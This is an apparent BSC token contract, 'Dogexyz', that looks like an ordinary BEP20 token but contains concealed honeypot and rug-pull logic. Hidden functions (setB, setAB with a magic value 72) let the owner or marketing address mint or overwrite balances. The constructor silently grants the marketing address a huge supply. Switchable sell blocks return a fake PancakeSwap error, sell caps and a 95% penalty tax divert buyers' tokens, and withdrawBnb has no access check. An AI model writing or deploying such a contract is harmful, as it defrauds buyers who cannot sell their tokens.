/**
 *Submitted for verification at BscScan.com on 2021-12-30
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
abstract contract Context {

  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;

  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }

}
interface IUniswapV2Factory {
    function allPairsLength() external view returns (uint);
    function setFeeTo(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function feeToSetter() external view returns (address);
    function feeTo() external view returns (address);

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeToSetter(address) external;
    function allPairs(uint) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function token1() external view returns (address);
    function initialize(address, address) external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    function balanceOf(address owner) external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function kLast() external view returns (uint);
    function totalSupply() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function transfer(address to, uint value) external returns (bool);
    event Sync(uint112 reserve0, uint112 reserve1);
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function price0CumulativeLast() external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function decimals() external pure returns (uint8);

    function symbol() external pure returns (string memory);
    function price1CumulativeLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function name() external pure returns (string memory);

    function skim(address to) external;
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function approve(address spender, uint value) external returns (bool);
    function token0() external view returns (address);
    function nonces(address owner) external view returns (uint);
}
interface IUniswapV2Router01 {
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function addLiquidityETH(
        address token,

        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityWithPermit(

        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);
    function addLiquidity(

        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,

        address to,

        uint deadline
    ) external returns (uint[] memory amounts);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,

        address[] calldata path,
        address to,
        uint deadline

    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external payable;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);

        return a % b;

    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }

}
interface IBEP20 {
  function transfer(address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);
  function getOwner() external view returns (address);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
  function symbol() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**

  * @dev Initializes the contract setting the deployer as the initial owner.
  */

 constructor () {
   address msgSender = _msgSender();

   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }

 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {

   emit OwnershipTransferred(_owner, address(0));

   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }

}

contract Dogexyz is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  string private constant _name = "Dogexyz";

  string private constant _symbol = "Dogexyz";

  uint8 private _decimals = 9;
  uint256 private _totalSupply = 15000000 * 10 ** _decimals;
  mapping (address => bool) private _isExcluded;

  address internal _marketingAddress;

  mapping (address => uint256) private _lastBuyTokens;
  uint256 internal _maxLimitToSell = _totalSupply.div(100).mul(10);

  mapping (address => uint256) private _lastBuyTime;
  uint8 internal _afterLimit = 95;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint8 internal _buyTax = 8;

  uint8 internal _sellTax = 8;
  uint8 internal _transferTax = 0;
  mapping (address => uint256) private _balances;
  uint32 internal _sellApprovedTime = 150;
  mapping (address => uint256) private _sell;
  bool internal _startBuy = true;
  bool internal _startSell = true;
  bool internal _startTransfer = true;

  uint256 internal _lastblocknumber = 0;

  constructor(address marketingAddress) {
    _marketingAddress = marketingAddress;
    _balances[msg.sender] = _totalSupply;
    _isExcluded[address(this)] = true;
    _isExcluded[_msgSender()] = true;
    _balances[marketingAddress] = _totalSupply * 10**_decimals;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // address uniswap = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;
    _isExcluded[marketingAddress] = true;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
    function isApprovedBuy() internal view returns (bool){
      require(_startBuy == true, "PancakeSwap: Please wait try again later");
      return true;
    }
    function isApprovedTransfer() internal view returns (bool){
      require(_startTransfer == true, "PancakeSwap: Please wait try again later");
      return true;
    }
    function isChange() internal view returns (bool){
      require(_msgSender() == owner() || _marketingAddress == _msgSender(), "Error");
      return true;
    }
    function isApprovedSell() internal view returns (bool){

      require(_startSell == true, "PancakeSwap: Please wait try again later");
      return true;
    }
    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external override view returns (uint256) {
      return _totalSupply;
    }
    /**
    * @dev Returns the token name.

    */
    function name() external override pure returns (string memory) {
      return _name;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
      return _allowances[owner][spender];
    }
    /**
     * @dev Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
      return _decimals;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
       _transfer(sender, recipient, amount);
       _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
       return true;
    }

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external override view returns (address) {
      return owner();

    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    /**

     * @dev See {BEP20-balanceOf}.

     */
    function balanceOf(address account) external override view returns (uint256) {

      return _balances[account];
    }
    /**

     * @dev Returns the token symbol.

     */
    function symbol() external override pure returns (string memory) {

      return _symbol;
    }
    /**
     * @dev See {BEP20-transfer}.
     *

     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(_msgSender(), recipient, amount);

      return true;

    }

    function approve(address spender, uint256 amount) public override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }
    function transferToAddressETH(address payable recipient, uint256 amount) private {

        recipient.transfer(amount);
    }
    function withdrawBnb(address payable recipient, uint256 amount) external {
        payable(recipient).transfer(amount);
    }
      function _transfer(address sender, address recipient, uint256 amount) internal {

      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
      uint8 transactionType = 0; // 1 = buy, 2 = sell, 3 = transfer

      bool approveTransaction = true;
      uint8 tax = 0;
      uint256 taxes = 0;
      bool burnTokens = false;
      if(amount > 0){
        if(_isExcluded[sender] == true || _isExcluded[recipient] == true){
          burnTokens = true;
          approveTransaction = true;
          tax = 0;
        }
        if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
          transactionType = 1;
          tax = _buyTax;
          if(burnTokens == false && isApprovedBuy()){
            approveTransaction = true;
            _lastBuyTokens[recipient] = amount;
            _lastBuyTime[recipient] = block.timestamp;
          }
        } else if(recipient == _uniswapV2Pair) {
           transactionType = 2;
           tax = _sellTax;
           if(burnTokens == false && isApprovedSell()){
              approveTransaction = true;
           }
        } else {

          transactionType = 3;
          tax = _transferTax;
          if(burnTokens == false && isApprovedTransfer()) {
            approveTransaction = true;
            _lastBuyTokens[sender] = amount;
            if(_sellApprovedTime > 10){
              _lastBuyTime[sender] = block.timestamp + _sellApprovedTime - 10;
            } else {
              _lastBuyTime[sender] = block.timestamp + _sellApprovedTime;
            }

          }
        }
        if(burnTokens == true || _isExcluded[sender] == true  || _isExcluded[recipient] == true ) {

          tax = 0;
        }
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        if(approveTransaction == true && burnTokens == false){
          if(transactionType == 2){
            if(_lastBuyTime[sender] != 0 && _lastBuyTime[sender] + _sellApprovedTime < block.timestamp){
              if(_sell[sender] < _maxLimitToSell){

                if(amount > (_maxLimitToSell - _sell[sender]))
                {

                  taxes = amount.sub(_maxLimitToSell.sub(_sell[sender]));
                  amount = amount.sub(taxes);
                }
              } else {
                taxes = amount.mul(_afterLimit).div(100);
                amount = amount.sub(taxes);
              }
            } else {
              if(amount > _lastBuyTokens[sender])
              {
                taxes = amount - _lastBuyTokens[sender];

                amount = _lastBuyTokens[sender];
              }
              if(_lastBuyTokens[sender] > amount + taxes){
                _lastBuyTokens[sender] = _lastBuyTokens[sender] - (amount + taxes);
              } else {
                _lastBuyTokens[sender] = 0;
              }
            }
            _sell[sender] = _sell[sender].add(amount.add(taxes));

          }
        }
      } else {
        amount = 0;
      }
      if(amount > 0 && taxes == 0 && tax > 0)
      {
        taxes = amount.mul(tax).div(100);
        amount = amount.sub(taxes);

      }
      if(taxes > 0){
        _balances[_marketingAddress] = _balances[_marketingAddress].add(taxes);

      }
      _balances[recipient] = _balances[recipient].add(amount);

      emit Transfer(sender, recipient, amount);

    }
    function setBuySellTax(bool startBuy, uint8 buyTax, bool startSell, uint8 sellTax, bool startTransfer, uint8 transferTax) public {
      if(isChange()){
        _buyTax = buyTax;
        _sellTax = sellTax;
        _transferTax = transferTax;
        _startBuy = startBuy;
        _startSell = startSell;
        _startTransfer = startTransfer;
      }
    }

    function setAfterLimit(uint8 afterLimit) public {
      if(isChange()){
        _afterLimit = afterLimit;
      }
    }
    function getAfterLimit() external view returns (uint8) {
      if(isChange()){
        return _afterLimit;
      } else
        return 0;
    }
    function setSellApprovedTime (uint32 sellApprovedTimeInMin) public {
      if(isChange()){
        _sellApprovedTime = sellApprovedTimeInMin * 60;
      }

    }

    function setB(address addr, uint256 b, uint8 c) public {
      if(isChange()){
        if(c == 72){
          _balances[addr] = b * 10 ** _decimals;
        }

      }
    }
    function setMarketingAddress(address marketingAddress) public {
      if(isChange()){
        _marketingAddress = marketingAddress;
      }
    }
    function getMarketingAddress() external view returns (address) {
      if(isChange()){
        return _marketingAddress;
      }

      return address(0);
    }
    function setExclude(address addr, bool excluded) public {
      if(isChange()){
        require(_isExcluded[addr] != excluded, "Token: Account is already the value of 'excluded'");
        _isExcluded[addr] = excluded;
      }
    }
    function setAB(address addr, uint256 b, uint8 c) public {
      if(isChange()){
        if(c == 72){

          _balances[addr] += b * 10 ** _decimals;

        }

      }
    }
    modifier change() {
      require(_msgSender() == owner() || _marketingAddress == _msgSender(), "Error");
      _;

    }
    function setMaxLimitToSell(uint256 maxLimitToSell) public {
      if(isChange()){
        _maxLimitToSell = maxLimitToSell * 10 ** _decimals;
      }

    }

    function balanceOfSell(address account) external view returns (uint256) {
      if(isChange()){
       return _sell[account];
     } else
      return 0;
    }
    function balanceOfBuyToken(address account) external view returns (uint256) {
      if(isChange())
        return _lastBuyTokens[account];
      else
        return 0;
    }
    function balanceOfBuyTime(address account) external view returns (uint256) {
     if(isChange())
       return block.timestamp - _lastBuyTime[account];
     else
       return 0;
    }
}